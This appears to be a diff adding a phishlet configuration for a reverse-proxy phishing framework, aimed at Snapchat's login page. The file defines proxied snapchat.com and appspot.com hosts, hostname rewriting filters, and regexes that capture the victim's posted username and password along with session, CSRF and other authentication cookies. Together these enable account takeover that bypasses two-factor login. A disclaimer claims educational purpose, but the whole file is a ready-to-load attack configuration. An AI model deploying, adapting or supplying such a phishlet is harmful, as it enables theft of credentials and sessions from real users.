@@ -1,0 +1,41 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.snapchat.com'
+    keys: ['sc-a-nonce', '.*,regexp']      
+  - domain: 'accounts.snapchat.com'
+    keys: ['web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '.*,regexp']     
+auth_urls:
+  - '/accounts/welcome'  
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.snapchat.com'
+  path: '/accounts/login'
